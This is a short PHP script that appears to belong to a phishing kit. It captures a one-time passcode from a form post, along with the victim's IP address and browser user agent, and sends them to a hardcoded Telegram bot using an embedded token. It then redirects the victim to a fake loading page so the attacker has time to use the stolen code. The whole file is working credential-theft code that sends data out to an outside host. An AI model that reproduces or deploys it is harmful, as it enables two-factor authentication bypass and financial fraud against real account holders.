<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Telegram Bot Credentials
   $botToken = "8585828847:AAFjkTFcI696kQNqb1ewBZOiQCLgO7CVix4";  // Replace with your bot token
       $chatId = "-5238377956";      // Replace with your chat ID
	   

    // Get User Data
    $otpCode = isset($_POST['otp']) ? $_POST['otp'] : 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Format the Message
    $message = "🔒 *New OTP Entry Received* 🔒\n\n"
             . "💳 *OTP:* `$otpCode`\n"
             . "🌍 *IP Address:* `$ip`\n"
             . "📱 *User-Agent:* `$userAgent`\n"
             . "📅 *Time:* `" . date('Y-m-d H:i:s') . "`\n\n"
             . "📌 _Stay Alert!_";

    // Send to Telegram
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $context  = stream_context_create($options);
    file_get_contents($telegramUrl, false, $context);

    // Redirect to Loading Page
    header("Location: loading4.html");
    exit();
}
?>